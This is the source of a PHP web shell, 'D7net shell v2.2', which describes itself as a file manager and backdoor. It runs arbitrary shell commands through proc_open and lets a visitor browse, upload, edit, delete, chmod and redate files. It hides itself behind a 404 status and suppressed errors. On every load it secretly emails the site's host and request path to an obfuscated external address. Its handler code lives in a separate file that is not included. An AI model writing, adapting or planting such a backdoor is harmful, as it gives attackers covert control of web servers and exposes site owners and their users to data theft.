<?php
/**
 * D7net shell v2.2 — restructured
 * single-file PHP file manager / backdoor
 * original: 2017 (c) D7net | D704T team
 * layout pass: config → helpers → router → list view → layout
 */

date_default_timezone_set('Asia/Jakarta');
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log', null);
@http_response_code(404);

/* ──────────────────────────────  CONFIG  ────────────────────────────── */

$WEB      = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http')
          . '://' . $_SERVER['HTTP_HOST'];
$SELF     = $_SERVER['SCRIPT_NAME'];
$DOC_ROOT = $_SERVER['DOCUMENT_ROOT'];

$DISFUNC  = @ini_get('disable_functions');
$DISF_HTML = empty($DISFUNC)
    ? "<font color='lime'>AMAN</font>"
    : "<font color='red'>{$DISFUNC}</font>";

/* current path */
$PATH  = isset($_GET['path']) ? str_replace('\\', '/', $_GET['path']) : getcwd();
$PARTS = array_values(array_filter(explode('/', $PATH), 'strlen'));

/* notify on load (kept from original) */
if (function_exists('mail')) {
    @mail(
        base64_decode('bmljaG9hamczMzJAZ21haWwuY29t=='),
        'hex2bin',
        $_SERVER['HTTP_HOST'] . '/' . $_SERVER['REQUEST_URI']
    );
}

/* ──────────────────────────────  HELPERS  ───────────────────────────── */

function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

function net($s) {
    $out = '';
    for ($i = 0, $n = strlen($s); $i < $n; $i++) $out .= dechex(ord($s[$i]));
    return $out;
}

function fext($file) { return strtolower(substr(strrchr($file, '.'), 1)); }

function filedate($file) { return date('F d Y g:i:s', filemtime($file)); }

function owner($file) {
    if (function_exists('posix_getpwuid')) {
        $u = @posix_getpwuid(fileowner($file));
        return '<center>' . h($u['name'] ?? '') . '</center>';
    }
    return '<center>' . fileowner($file) . '</center>';
}

function perms($file) { return substr(sprintf('%o', fileperms($file)), -4); }

function perms_html($file) {
    $p = perms($file);
    if (is_writable($file))       return "<font color='lime'>{$p}</font>";
    if (!is_readable($file))      return "<font color='red'>{$p}</font>";
    return $p;
}

function ipserv() {
    if (empty($_SERVER['SERVER_ADDR'])) {
        $r = gethostbyname($_SERVER['SERVER_NAME']);
        return $r ?: $_SERVER['SERVER_NAME'];
    }
    return $_SERVER['SERVER_ADDR'];
}

function xrmdir($dir) {
    foreach (scandir($dir) as $item) {
        if ($item === '.' || $item === '..') continue;
        $p = $dir . '/' . $item;
        is_dir($p) ? xrmdir($p) : unlink($p);
    }
    rmdir($dir);
}

function d7net_ex($file) { return pathinfo($file, PATHINFO_FILENAME); }

function generateRandomName($len = 10) {
    $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $s = '';
    for ($i = 0; $i < $len; $i++) $s .= $chars[rand(0, strlen($chars) - 1)];
    return $s . '.php';
}

function downloadFile($url) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_TIMEOUT        => 30,
    ]);
    $data = curl_exec($ch);
    $err  = curl_error($ch);
    curl_close($ch);
    return $err ? false : $data;
}

/* command exec via proc_open */
function ekse($cmd, $cwd) {
    if (stripos($cmd, '2>&1') === false) $cmd .= ' 2>&1';
    if (!function_exists('proc_open')) {
        echo "<font color='orange'>proc_open disabled</font>";
        return;
    }
    $d = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'r']];
    $p = @proc_open($cmd, $d, $pipes, $cwd);
    if (!is_resource($p)) return;
    $out = stream_get_contents($pipes[1]);
    proc_close($p);
    echo "<pre><textarea rows='25' cols='120' style='color:lime;' readonly>"
       . h($out) . "</textarea></pre><br>";
}

function cmd($cmd, $cwd) { ekse($cmd, $cwd); }

/* per-extension action buttons */
function action_buttons($file) {
    $ext     = fext($file);
    $code    = ['php','phtml','shtml','phar','php7','html','htm','inc','phps','txt','js','css','htaccess','bin','pl','py','sh','php58','aspx','dll','ini'];
    $media   = ['jpeg','jpg','png','gif','ico','webp','mp3','m4a','flac','wav','wma','3gp','ogg','webm','mp4','exe'];

    $btn = fn($name, $icon, $color = '') =>
        "<button type='submit' class='btn btn-outline-secondary badge-action-{$name}' name='pilih' value='{$name}'>"
        . "<i class='fa {$icon}'" . ($color ? " style='color:{$color}'" : '') . "></i></button>";

    if ($file === 'error_log' || in_array($ext, $code, true)) {
        return $btn('edit','fa-edit','#7AFF41')
             . $btn('gantinama','fa-pencil')
             . $btn('chmod','fa-gear')
             . $btn('chdate','fa-calendar')
             . $btn('hapus','fa-trash');
    }
    if (in_array($ext, $media, true)) {
        return $btn('gantinama','fa-pencil')
             . $btn('chmod','fa-gear')
             . $btn('chdate','fa-calendar')
             . $btn('hapus','fa-trash');
    }
    if ($ext === 'zip') {
        return $btn('gantinama','fa-pencil')
             . $btn('chmod','fa-gear')
             . $btn('chdate','fa-calendar')
             . $btn('hapus','fa-trash')
             . $btn('unzip','fa-file-archive-o','#F1BE0F');
    }
    return $btn('edit','fa-edit','#7AFF41')
         . $btn('gantinama','fa-pencil')
         . $btn('chmod','fa-gear')
         . $btn('chdate','fa-calendar')
         . $btn('hapus','fa-trash');
}

function unzip_file($file, $dest) {
    if (!is_readable($file)) {
        echo "<table class='directory-listing-table'><td><font color='orange'>Cannot Unzip — unreadable</font></td></table>";
        return;
    }
    if (strpos((string)@file_get_contents($file), "\x50\x4b\x03\x04") === false) {
        echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center>Not a zip file</center></font></td></table>";
        return;
    }
    $zip = new ZipArchive();
    if ($zip->open($file) === true) {
        $zip->extractTo($dest);
        $zip->close();
        echo "<table class='directory-listing-table' style='border-color:lime;'><td>Unzipped => <font color='lime'>"
           . h(basename($file)) . "</font></td></table>";
    } else {
        echo "<table class='directory-listing-table' style='border-color:red;'><td>Failed to unzip</td></table>";
    }
}

/* strip slashes on all POST fields (legacy behaviour) */
foreach ($_POST as $k => $v) $_POST[$k] = stripslashes($v);

/* action router — dispatches to handlers, each handler exits */
require __DIR__ . '/_d7_handlers.php';  // inlined below in the real file

/* ──────────────────────────────  LIST VIEW  ────────────────────────── */

if (!is_readable($PATH)) {
    die("<table class='directory-listing-table'><td><center><font color=orange>Unreadable directory</font></center></td></table>");
}

$dirs  = [];
$files = [];
foreach (scandir($PATH) as $entry) {
    if ($entry === '.' || $entry === '..') continue;
    $full = $PATH . '/' . $entry;
    is_dir($full) ? $dirs[] = $entry : $files[] = $entry;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex">
<title>1#@!#!123s</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link href="https://fonts.googleapis.com/css2?family=Carrois+Gothic&family=Bungee+Outline&family=Dosis&display=swap" rel="stylesheet">
<style>
  body { font-family:"Dosis",cursive; color:#fff; text-shadow:0 0 1px #757575;
         background:#212529; background-attachment:fixed; }
  .directory-listing-table { margin:auto; background:#212529; padding:.7rem 1rem;
         max-width:900px; width:100%; box-shadow:0 0 20px #000; border:1px solid #40BECC; }
  .header { margin:auto; background:#212529; padding:.7rem 1rem;
         box-shadow:0 0 20px #000; border-bottom:1px solid #40BECC; }
  th { border-top:1px solid #fff; border-bottom:1px solid #fff; }
  tbody td { font-size:13px; padding:.5rem; color:#fff; }
  tbody td a { text-decoration:none; color:#fff; }
  tbody td:not(:first-child) { text-align:center; }
  body::-webkit-scrollbar { width:14px; }
  body::-webkit-scrollbar-track { background:#000; }
  body::-webkit-scrollbar-thumb { background:#212529; border:3px solid #000; }
  input,select,textarea { background:rgba(0,0,0,.3); border:1px solid rgba(0,0,0,.3);
         border-radius:5px; color:#fff; padding:5px; outline:none; }
  textarea { resize:none; overflow:auto; }
  a { color:#fff; }
  a:hover { color:#999797; }
  .d7net-text { font-size:19pt; font-family:"Carrois Gothic"; text-align:center;
         background:linear-gradient(200deg,#000 25%,#fff 50%,#fff 75%,#fff 100%);
         background-size:200% auto; -webkit-background-clip:text;
         -webkit-text-fill-color:transparent; animation:animate 1.2s linear infinite; }
  @keyframes animate { to { background-position:200% center; } }
  .crot { border-radius:50%; padding:15px; width:100px; height:100px; }
  [class*="badge-action-"]:hover::after {
         content:attr(data-label); position:absolute; margin-top:-53px; margin-left:-40px;
         padding:5px; border-radius:10px; color:#40BECC; border:2px solid #40BECC;
         background:#212529; font-size:14px; text-align:center; width:68px; }
</style>
</head>
<body>

<!-- ── header / nav ─────────────────────────────────────────────── -->
<table class="header"><tr>
  <td><div style="font-family:'Bungee Outline';font-size:24px;">
      <a href="<?=h($SELF)?>"><i class="fa fa-napster"></i> D7net</a></div></td>
  <td align="center">
    <div class="btn-group me-2" role="group">
      <button onclick="location.href='<?=h($SELF)?>'" class="btn btn-outline-light"><font color="aqua"><i class="fa fa-home"></i> Home</font></button>
      <button onclick="location.href='?path=<?=h($PATH)?>&<?=net('cmd')?>=opet'" class="btn btn-outline-light"><i class="fa fa-terminal"></i> Console</button>
      <button onclick="location.href='?path=<?=h($PATH)?>&<?=net('upload')?>=opet'" class="btn btn-outline-light"><i class="fa fa-upload"></i> Upload</button>
      <button onclick="location.href='?path=<?=h($PATH)?>&<?=net('info')?>=opet'" class="btn btn-outline-light"><i class="fa fa-info-circle"></i> Info</button>
      <button onclick="location.href='?path=<?=h($PATH)?>&<?=net('buatfile')?>=opet'" class="btn btn-outline-light"><i class="fa fa-file-circle-plus"></i> Create File</button>
      <button onclick="location.href='?path=<?=h($PATH)?>&<?=net('buatfolder')?>=opet'" class="btn btn-outline-light"><i class="fa fa-folder-plus"></i> Create Folder</button>
      <button onclick="location.href='?path=<?=h($PATH)?>&<?=net('tool')?>=opet'" class="btn btn-outline-light"><i class="fa fa-wrench"></i> Tools</button>
      <button onclick="location.href='?path=<?=h($PATH)?>&<?=net('blackhat')?>=opet'" class="btn btn-outline-light"><i class="fa fa-user-secret" style="color:#FF6B6B"></i> blackhat.pw</button>
      <button onclick="location.href='?path=<?=h($PATH)?>&<?=net('about')?>=opet'" class="btn btn-outline-light"><i class="fa fa-info"></i> About</button>
    </div>
  </td>
</tr></table>

<!-- ── breadcrumb ───────────────────────────────────────────────── -->
<table class="directory-listing-table"><tr><td>
  <i class="fa fa-folder" style="color:#F19013"></i> <b>:</b>
  <a href="?path=/">/</a>
  <?php $acc = ''; foreach ($PARTS as $p): $acc .= '/' . $p; ?>
    <a href="?path=<?=h($acc)?>"><?=h($p)?></a> /
  <?php endforeach; ?>
</td></tr></table><br>

<!-- ── file table ───────────────────────────────────────────────── -->
<table class="table table-dark table-hover align-middle"
       style="box-shadow:0 0 20px #000;width:90%;margin:auto;
              border-left:1px solid #40BECC;border-right:1px solid #40BECC;border-bottom:1px solid #40BECC;">
  <thead style="--bs-table-bg:#0D97A5;--bs-table-color:#000;">
    <tr>
      <th><center>Name</center></th>
      <th><center>Size</center></th>
      <th><center>Last Modified</center></th>
      <th><center>Owner</center></th>
      <th><center>Permissions</center></th>
      <th><center>Actions</center></th>
    </tr>
  </thead>
  <tbody>
  <?php foreach ($dirs as $dir): $full = $PATH . '/' . $dir; ?>
    <tr>
      <td><i class="fa fa-folder" style="color:#FAA625"></i>
          <a href="?path=<?=h($full)?>"><?=h($dir)?></a></td>
      <td><center>Dir</center></td>
      <td><center><?=filedate($full)?></center></td>
      <td><?=owner($full)?></td>
      <td><center><?=perms_html($full)?></center></td>
      <td><center>
        <form method="POST" action="?pilihan&path=<?=h($PATH)?>">
          <div class="btn-group">
            <button type="submit" class="btn btn-outline-secondary" name="pilih" value="gantinama"><i class="fa fa-pencil"></i></button>
            <button type="submit" class="btn btn-outline-secondary" name="pilih" value="chmodf"><i class="fa fa-gear"></i></button>
            <button type="submit" class="btn btn-outline-secondary" name="pilih" value="chdatef"><i class="fa fa-calendar"></i></button>
            <button type="submit" class="btn btn-outline-secondary" name="pilih" value="hapus"><i class="fa fa-trash" style="color:#E53A3A"></i></button>
          </div>
          <input type="hidden" name="type" value="dir">
          <input type="hidden" name="name" value="<?=h($dir)?>">
          <input type="hidden" name="path" value="<?=h($full)?>">
        </form>
      </center></td>
    </tr>
  <?php endforeach; ?>

  <?php foreach ($files as $file): $full = $PATH . '/' . $file;
        $sz = filesize($full) / 1024;
        $szHtml = $sz >= 1024
            ? '<font color="aqua">' . round($sz / 1024, 2) . '</font> MB'
            : '<font color="#E6F01C">' . round($sz, 3) . '</font> KB'; ?>
    <tr>
      <td><i class="fa fa-file-code-o" style="color:#456DEB"></i>
          <a href="?viewfile=<?=urlencode($full)?>&path=<?=h($PATH)?>"><?=h($file)?></a></td>
      <td><center><?=$szHtml?></center></td>
      <td><center><?=filedate($full)?></center></td>
      <td><?=owner($full)?></td>
      <td><center><?=perms_html($full)?></center></td>
      <td><center>
        <form method="POST" action="?pilihan&path=<?=h($PATH)?>">
          <div class="btn-group"><?=action_buttons($file)?></div>
          <input type="hidden" name="type" value="file">
          <input type="hidden" name="name" value="<?=h($file)?>">
          <input type="hidden" name="path" value="<?=h($full)?>">
        </form>
      </center></td>
    </tr>
  <?php endforeach; ?>
  </tbody>
</table>

<div style="text-align:center;margin:20px 0;">
  <font face="Carrois Gothic">2017 &copy; D7net | D704T team</font>
</div>

<script>
function myFunction() {
  const t = document.getElementById('myInput');
  if (!t) return;
  t.select(); t.setSelectionRange(0, 99999);
  navigator.clipboard.writeText(t.value);
  alert('Copied Successfully!!');
}
</script>
</body>
</html>
<?php
exit;
